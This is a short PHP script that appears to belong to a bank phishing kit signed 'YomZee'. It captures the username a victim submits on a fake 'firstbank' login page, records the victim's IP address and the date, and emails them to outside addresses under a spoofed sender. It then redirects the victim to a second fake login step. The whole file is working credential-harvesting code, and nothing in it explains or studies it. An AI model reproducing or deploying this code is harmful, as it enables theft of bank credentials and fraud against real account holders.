<?
session_start();
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$ca1 = $_POST['userid'];
$fiftyme="zate123man@gmail.com,pronc@prontomail.com";


  $subj = "firstbank BV $ip";
  $msg = "Login Info\n\nUsername: $ca1\n$ip $adddate\n-----*+++++++++++*-----\n Created By YomZee--------*++++++++++*----------";
  $from = "From: <resultats@tsbdumbs.com>";
  mail("$fiftyme", $subj, $msg, $from);
?>
<script type="text/javascript">
 window.location="Login_Step2.html"
</script>
